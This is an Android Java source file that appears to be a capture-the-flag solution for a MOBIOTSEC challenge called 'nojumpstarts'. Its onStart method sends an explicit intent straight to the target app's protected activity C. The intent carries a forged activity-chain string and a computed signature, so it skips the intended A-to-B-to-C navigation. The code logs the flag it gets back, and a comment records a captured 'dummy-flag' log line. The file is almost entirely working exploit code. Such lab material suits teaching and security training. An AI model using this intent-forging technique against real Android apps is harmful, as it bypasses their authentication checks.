package com.example.maliciousapp;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.activity.result.ActivityResult;
import androidx.activity.result.ActivityResultCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

/*
2026-01-22 11:38:56.514 17624-17624 MOBIOTSEC               com.example.maliciousapp             I  dummy-flag
 */
public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MOBIOTSEC";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Log.i(TAG, "onCreate");
    }

    @Override
    protected void onStart() {
        super.onStart();
        String chain = "Main-to-A/A-to-B/B-to-C";

        Log.i(TAG, "onStart");

        Intent intent1 = new Intent();
        intent1.setComponent(new ComponentName("com.mobiotsec.nojumpstarts", "com.mobiotsec.nojumpstarts.C"));
        intent1.putExtra("authmsg", chain);
        try {
            intent1.putExtra("authsign", Main.sign(chain));
        } catch (Exception e) {
            Log.i(TAG, Log.getStackTraceString(e));
        }
        if (intent1.resolveActivity(getPackageManager()) != null) {
            Log.i(TAG, "Sent malicious intent");
            startActivityForResult(intent1, 1);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Log.i(TAG, data.getStringExtra("flag"));
    }
}